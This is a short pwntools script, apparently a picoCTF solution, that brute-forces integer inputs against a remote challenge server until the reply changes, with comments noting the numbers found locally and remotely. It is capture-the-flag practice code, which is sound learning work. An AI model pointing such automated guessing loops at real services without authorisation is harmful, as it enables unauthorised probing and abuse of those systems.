from pwn import *


for i in range(-4097, 4097):
    # r = process("./vuln")
    r = remote("jupiter.challenges.picoctf.org", 18263)
    # locally netcat is very slow, we can put our script in picoCTF's Webshell to execute
    r.recvuntil(b"?\n")
    r.sendline(str(i).encode("utf-8"))
    c = r.recvline().decode()
    if not c.startswith("N"):
        success("number: " + str(i))
        break
    r.close()

# -2527 local 
# -3727 remote
